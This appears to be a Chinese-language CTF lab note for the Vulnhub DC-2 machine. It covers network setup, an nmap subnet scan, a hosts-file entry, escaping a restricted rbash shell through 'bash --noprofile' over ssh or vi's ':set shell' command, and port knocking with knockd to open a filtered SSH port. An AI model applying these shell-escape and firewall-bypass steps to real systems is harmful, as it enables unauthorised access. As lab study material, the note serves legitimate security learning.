## Vulnhub 环境配置
从 Vulnhub 上下载 DC-2

出现这种情况不用管
![[QQ_1724288171005.png]]

查看 IP 地址
```
ip a
```

红框是咱们的 IP
![[QQ_1724288271415.png]]

由于我的 `kali` 和 `DC-2` 都用 NAT 模式，应该是开了共享 NAT 网络，所以扫描同一网段即可
```
nmap 192.168.84.0/24
```

红框是目标机器
![[QQ_1724288322538.png]]

```
本机IP:
192.168.84.128
目标IP:
192.168.84.129
```

```
sudo nano /etc/hosts
```

```
192.168.84.129  dc-2
```

## 修改`hosts`文件来提高网页访问速度
- **用途**：通过将常用的域名直接映射到其 IP 地址，减少 DNS 查询时间，从而提高访问速度。
- **示例**：将一个常访问的网站的域名与其 IP 地址直接映射，避免每次访问时都进行 DNS 解析。
    `192.168.1.100 mylocalserver.local`
## 逃逸 `rbash`
### 不加载配置文件
`rbash` -- restricted bash
```
ssh joe@192.168.204.77 -t "bash --noprofile"
```
### 利用 `vi`
`vi` 或 `vim` 可以被用来逃逸受限的 `rbash` 环境，因为它是一个功能强大的文本编辑器，具有执行外部命令的能力。即使在 `rbash` 环境中，如果 `vi` 或 `vim` 可用，用户可能会利用它来运行未受限的命令，进而逃逸出受限的 shell。

如果可以用 `vi`
```
vi
:set shell=/bin/bash
:shell
export PATH=/bin/:/usr/bin/:/usr/local/bin:$PATH
```
## `ssh` 为 filtered 状态，`knockd`
`ssh` 的22端⼝状态是filtered 的，可能是运⾏了knockd服务，才导致ssh处于关闭状态 如字⾯意思，类似‘敲⻔’，只是这⾥敲的是‘端⼝’，⽽且需要按照顺序‘敲’端⼝。如果敲击规则匹 配，则可以让防⽕墙实时更改策略。从⽽达到开关防⽕墙的⽬的。使⽤者连接之前必须先依序 '敲 击' 指定端⼝ (port knocking)， knockd 才开放受到保护的端⼝。 knockd服务的配置⽂件为 `/etc/knockd.conf` 

```
/etc/knockd.conf
```

```
knock 192.168.159.209 7469 8475 9842
```
